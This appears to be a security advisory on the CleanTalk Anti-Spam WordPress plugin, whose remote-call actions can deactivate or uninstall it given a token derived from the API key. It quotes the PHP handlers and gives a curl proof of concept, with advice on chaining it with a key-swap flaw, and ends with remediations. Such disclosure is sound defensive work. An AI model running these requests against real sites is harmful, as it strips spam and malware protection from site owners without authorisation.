# CTSP-005: Remote Plugin Self-Deactivation/Uninstallation via Remote Calls

## Severity: High (CVSS ~6.5)

## Summary

The CleanTalk Remote Calls system includes `deactivate_plugin` and `uninstall_plugin` actions that, when called with a valid token, can remotely deactivate or completely uninstall the CleanTalk Anti-Spam plugin and its companion Security & Malware Scan plugin. This is a denial-of-security-service vector that strips spam and malware protection from the target site.

## Affected Code

### Remote Call Handlers (RemoteCalls.php, lines 327-338)

```php
public static function action__deactivate_plugin()
{
    add_action('wp', 'apbct_rc__deactivate_plugin', 1);
}

public static function action__uninstall_plugin()
{
    add_action('wp', 'apbct_rc__uninstall_plugin', 1);
}
```

### Plugin Deactivation (cleantalk.php, lines 2213-2258)

```php
function apbct_rc__deactivate_plugin()
{
    $plugin = Request::getString('plugin');
    $allowed_plugins = array(
        'cleantalk-spam-protect/cleantalk.php',
        'security-malware-firewall/security-malware-firewall.php',
    );
    if ( $plugin && !in_array($plugin, $allowed_plugins, true) ) {
        die('FAIL ' . json_encode(array('error' => 'PLUGIN_NOT_ALLOWED')));
    }
    // ... proceeds to deactivate the specified plugin
}
```

## Proof of Concept

```bash
# Deactivate CleanTalk Anti-Spam
curl -X POST "https://target.com/" \
  -d "spbc_remote_call_action=deactivate_plugin" \
  -d "spbc_remote_call_token=<md5_of_apikey>" \
  -d "plugin_name=antispam" \
  -d "plugin=cleantalk-spam-protect/cleantalk.php"

# Uninstall CleanTalk Anti-Spam entirely
curl -X POST "https://target.com/" \
  -d "spbc_remote_call_action=uninstall_plugin" \
  -d "spbc_remote_call_token=<md5_of_apikey>" \
  -d "plugin_name=antispam" \
  -d "plugin=cleantalk-spam-protect/cleantalk.php"
```

## Impact

- Complete removal of spam protection from the target site
- Combined with spam bot traffic, enables mass spam injection after protection is disabled
- Can be chained: first use CTSP-004 to swap the API key (giving attacker the new token), then deactivate the plugin
- Site administrators may not notice protection is gone until spam arrives

## Preconditions

- Requires a valid `spbc_remote_call_token` (md5 or sha256 of the API key)
- Only CleanTalk's own plugins can be deactivated (strict allowlist)
- Cannot be used to deactivate/uninstall arbitrary plugins

## Remediation

1. Remove the ability to self-deactivate/uninstall via remote calls, or add multi-factor verification
2. Send an email notification to the site admin when the plugin is remotely deactivated
3. Use a stronger authentication mechanism than md5(api_key)
